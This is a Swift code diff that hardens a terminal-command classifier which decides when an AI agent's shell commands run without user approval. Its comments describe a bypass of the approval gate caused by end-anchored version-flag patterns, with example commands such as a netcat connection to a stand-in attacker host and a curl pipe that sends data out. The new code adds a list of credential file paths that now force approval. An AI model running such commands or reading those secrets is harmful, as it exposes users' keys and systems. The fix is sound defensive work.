@@ -164,10 +164,21 @@ class TerminalCommandClassifier {
         ("^echo\\s+[^>|&$`]+$", .shellOperation, "Display text"),
         ("^printf\\s", .shellOperation, "Format and print text"),
 
-        // Version checks
-        ("--version$", .systemInfo, "Check version"),
-        ("-v$", .systemInfo, "Check version"),
-        ("-V$", .systemInfo, "Check version"),
+        // NOTE: there were three generic version-check patterns here — "--version$", "-v$"
+        // and "-V$". They are removed and must not come back in this form.
+        //
+        // `matches(_:pattern:)` uses firstMatch and these patterns are anchored only at the
+        // END, so they classified ANY command ending in those flags as .safe — naming no
+        // executable at all. `nc evil.tld 4444 -v`, `python3 /tmp/implant.py -v` and
+        // `osascript /tmp/x.scpt -v` all auto-executed with no approval sheet. The
+        // structural guard in isCompoundOrControlCommand cannot catch them either, because
+        // they are simple argv commands with no shell metacharacters — the danger is the
+        // binary being invoked, not the syntax.
+        //
+        // Version checks for tools that should auto-run are covered by their own
+        // executable-anchored patterns above (^brew\s+--version, ^npm\s+--version,
+        // ^pip\s+--version, ^cargo\s+--version). Any other tool's version check now takes
+        // the approval path, which is the correct default for an unrecognised executable.
     ]
 
     // MARK: - Approval Required Patterns (Medium Risk)
@@ -404,6 +415,46 @@ class TerminalCommandClassifier {
 
     // MARK: - Classification
 
+    /// True when a command is anything more than a single simple invocation — it chains,
+    /// substitutes, redirects, backgrounds, or runs a find/xargs primary that executes or
+    /// deletes. Such a command must NEVER auto-execute: the safe-pattern allowlist only
+    /// matches the FIRST token, so `cat $(…)`, `ls && curl … | bash`, `find … -delete`, or
+    /// `grep … | curl … evil.tld` would otherwise be whitelisted whole and run with no prompt.
+    /// This is the structural precondition for `.safe` — not a denylist. Fails closed: when
+    /// in doubt it forces the approval sheet rather than auto-running.
+    private func isCompoundOrControlCommand(_ command: String) -> Bool {
+        // Shell operators that turn a simple command into chaining / substitution /
+        // redirection / process substitution / backgrounding, plus raw newlines.
+        let controlOperators = [
+            ";", "&&", "||", "|", "`", "$(", "${", "<(", ">(",
+            ">", "<", "&", "\n", "\r",
+        ]
+        for op in controlOperators where command.contains(op) { return true }
+
+        // find/xargs primaries that execute or delete without any shell operator.
+        let lowered = command.lowercased()
+        let padded = " " + lowered + " "
+        let dangerousPrimaries = [
+            " -exec", " -execdir", " -delete", " -ok ", " -okdir",
+            " -fprint", " -fprintf", " -fls ",
+        ]
+        for primary in dangerousPrimaries where padded.contains(primary) { return true }
+
+        // Reads that touch secrets must not auto-run even as a single simple command —
+        // `cat ~/.ssh/id_rsa` is a bare read, but its output flows straight to the model /
+        // provider. Force approval when the command references credential-bearing paths.
+        let sensitivePaths = [
+            ".ssh", "id_rsa", "id_ed25519", "id_ecdsa", ".aws/credentials", ".aws/config",
+            ".env", ".netrc", ".pgpass", ".gnupg", ".kube/config", ".docker/config",
+            ".npmrc", ".pypirc", "keychain", ".git-credentials", "credentials.json",
+            ".bash_history", ".zsh_history", ".config/gh/hosts", "login data", "cookies",
+            "secret", "private_key", "privatekey", ".p12", ".pem",
+        ]
+        for path in sensitivePaths where lowered.contains(path) { return true }
+
+        return false
+    }
+
     func classify(_ command: String) -> CommandClassification {
         let trimmedCommand = command.trimmingCharacters(in: .whitespacesAndNewlines)
 
@@ -422,18 +473,26 @@ class TerminalCommandClassifier {
             }
         }
 
+        // A safe classification requires a single simple command. If the command chains,
+        // substitutes, redirects, backgrounds, or runs an exec/delete primary, skip the
+        // safe-pattern allowlist entirely — it only matches the first token and would
+        // whitelist the whole line. Such commands fall through to the approval path below.
+        let isCompound = isCompoundOrControlCommand(trimmedCommand)
+
         // Check safe patterns
-        for (pattern, category, explanation) in safePatterns {
-            if matches(trimmedCommand, pattern: pattern) {
-                return CommandClassification(
-                    command: trimmedCommand,
-                    category: category,
-                    riskLevel: .safe,
-                    explanation: explanation,
-                    requiresApproval: false,
-                    blockedReason: nil,
-                    suggestedAlternative: nil
-                )
+        if !isCompound {
+            for (pattern, category, explanation) in safePatterns {
+                if matches(trimmedCommand, pattern: pattern) {
+                    return CommandClassification(
+                        command: trimmedCommand,
+                        category: category,
+                        riskLevel: .safe,
+                        explanation: explanation,
+                        requiresApproval: false,
+                        blockedReason: nil,
+                        suggestedAlternative: nil
+                    )
+                }
             }
         }
 
